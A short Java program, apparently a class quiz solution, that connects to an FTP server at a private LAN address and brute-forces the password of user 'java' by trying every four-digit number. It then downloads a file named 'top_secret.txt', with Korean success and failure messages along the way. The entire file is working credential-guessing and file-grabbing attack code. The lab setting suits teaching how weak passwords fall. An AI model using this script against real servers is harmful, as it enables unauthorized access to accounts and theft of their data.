import java.io.File;
import it.sauronsoftware.ftp4j.FTPClient;

public class Quiz4 {
	public static void main(String[] args) throws Exception{

		FTPClient client = new FTPClient();

		client.connect("192.168.0.186");


		for(int i=1000; i<=9999; i++) {
			try {
				client.login("java",String.valueOf(i)); //1 3 5
				System.out.println("로그인 성공");
				break;
			}catch(Exception e) {
				System.out.println("로그인 실패 : "+i);
			}
		}
		
		client.download("top_secret.txt", new File("C:/workspace/downloads/success.txt"));
		System.out.println("다운로드가 성공적으로 완료되었습니다.");

		client.disconnect(true);

	}

}
